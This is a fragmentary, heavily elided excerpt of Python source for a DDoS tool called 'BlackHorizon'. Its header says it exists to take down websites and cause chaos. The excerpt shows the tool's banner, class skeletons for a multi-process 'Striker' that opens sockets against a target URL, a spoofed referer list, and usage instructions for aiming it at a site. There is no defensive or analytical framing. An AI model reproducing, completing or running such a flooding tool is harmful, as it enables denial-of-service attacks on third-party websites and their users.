...
#Black Horizon DDoS Tool Created for takedown some websites and give chaos    #
#################################Anonymous#####################################
###############################WE ARE HERE#####################################
###############################################################################
###################################2E4H########################################
...
BLACKHORIZON_BANNER = 'BlackHorizon Clound Based DDoS Tool Created For InYour Members'
...
class BlackHorizon(object):
    ...
    # Containers
    cloundsQueue = []                                                  ###############################
    manager = None                                                     #~~~~MadeByInYourStranger~~~~~#
    useragents = []                                                    #~~~~~~~~~~@FollowMe~~~~~~~~~~#
                                                                       #~~~~~~WATCH THIS BITCH~~~~~~~#
...
class Striker(Process):
    ...
    def __init__(self, url, nr_sockets, counter):
        ...
        self.referers = [ 
            ...
            'https://www.nasa.gov/',                                              #From 2Easy4Hack Team      #
...
def usage():
    print BLACKHORIZON_BANNER 
    print ' USAGE: python blackhorizon.py http://www.target.com/ [OPTIONS]'
